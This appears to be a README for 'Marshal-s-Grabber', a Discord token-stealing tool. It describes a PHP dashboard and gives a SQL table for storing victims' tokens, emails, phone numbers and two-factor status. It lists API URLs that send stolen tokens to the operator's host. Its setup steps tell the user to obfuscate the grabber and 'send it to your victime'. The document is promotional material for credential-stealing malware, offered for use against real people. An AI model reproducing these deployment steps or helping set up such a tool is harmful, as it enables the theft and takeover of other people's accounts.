# Marshal-s-Grabber
The Best Most powerfull token grabber with dashboard.
<div align="center">
  <h2>🚀 Marshal`s Lab 🚀</h2>
  <p>The most powerfull Discord Token Grabber with Dasboard</p>
  <a href="https://discord.gg/GPVnYTzsFF" target="_blank">Join my Discord Server</a><br><br>

  <img src="https://i.imgur.com/l9hMrQO.gif" width="60%">
</div>

<br><br><br>


> ## Features
> - All in Interface
> - Can't delete webhook
> - Custom API for fetch/remove/add tokens
> - Login system with secret password
> - Grabber on 22 Applications/browsers
> - Very Simple Usage

<br><br>

> ## Usage
> For use Marshal, you need a Server accept PHP and contain a database,
> 1. Put the files in your host
> 2. Go to your phpmyadmin, in section SQL paste that:
> ```sql
> CREATE TABLE `tokens` (
>   `user_id` text NOT NULL,
>   `username` text NOT NULL,
>   `avatar` text NOT NULL,
>   `email` text NOT NULL,
>   `phone` text NOT NULL,
>   `badges` text NOT NULL,
>   `nitro_badges` text NOT NULL,
>   `twofactor` text NOT NULL,
>   `token` text NOT NULL
> ) ENGINE=InnoDB DEFAULT CHARSET=utf8;
> ```
> 3. Make your database ip,databse name,username,password in the file `Inc/database.php`
> 4. Setup your passwords and webhooks in `INC/functions.php`
> 5. Make your host adress in `Grabber/python/marshal.py` at line 5
> 6. Compile and obfuscated your Grabber and send it to your victime :)

> 7. Put a stars and follow me for more :)

<br><br>

> ## API Working
> - Add Discord Token To Database
> - - `https://yourhost.com/api?type=addtoken&token=THE_VICTIME_TOKEN`
> - Remove Discord Token From Database
> - - `https://yourhost.com/api?type=removetoken&password=YOUR_SECRET_PASSWORD&token=THE_VICTIME_TOKEN`
> - Fetch Discord Token Info From Database
> - - `https://yourhost.com/api?type=fetchtoken&password=YOUR_SECRET_PASSWORD&token=THE_VICTIME_TOKEN`

<br><br>

## Demos
> - ### Login Page
> ![](https://i.imgur.com/3IdyaPV.jpg)
> - ### Index Page
> ![](https://i.imgur.com/st95pJF.jpg)
> - ### Tokens Page
> ![](https://cdn.discordapp.com/attachments/924736351855849562/926064389650530354/unknown.png)
> - ### Youtube Demo soon
> [![](https://i.imgur.com/j79yzMM.gif)](https://www.youtube.com/watch?v=4JfiFdiOCUk&ab_channel=KanekiWeb)

<p align="center">
  <img src="https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat" alt="Contribution Welcome">
  <img src="https://img.shields.io/badge/License-GPLv3-blue.svg" alt="License Badge">
  <img src="https://badges.frapsoft.com/os/v3/open-source.svg?v=103" alt="Open Source">
  <img src="https://visitor-badge.laobi.icu/badge?page_id=KanekiWeb.Xenos" alt="Visitor Count">
</p>
